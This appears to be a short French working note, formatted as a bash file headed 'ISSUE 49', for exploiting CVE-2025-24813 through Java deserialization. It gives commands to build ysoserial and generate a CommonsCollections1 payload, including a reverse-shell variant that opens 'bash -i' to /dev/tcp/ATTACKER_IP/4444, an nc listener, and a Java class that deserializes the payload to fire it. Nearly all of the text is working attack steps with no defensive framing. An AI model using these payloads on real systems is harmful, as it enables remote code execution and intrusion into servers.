#!/bin/bash

#
# ISSUE 49
#

todo : 


https://github.com/charis3306/CVE-2025-24813/



# generation du payload : 

```
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests
```

Write tests : 

```
java -jar target/ysoserial-[version]-all.jar CommonsCollections1 '/bin/sh -c "echo aaa > /tmp/test"' > payload.ser
```

variante reverse shell : 

```
java -jar target/ysoserial-[version]-all.jar CommonsCollections1 '/bin/sh -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > payload.ser
```

ensuite : 

```
nc -lvnp 4444
```


# Testing deserialization : 


```

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class DeserializeTest {
    public static void main(String[] args) throws Exception {
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();  
    }
}

```

Ensuite : 

```
javac DeserializeTest.java
java DeserializeTest
``
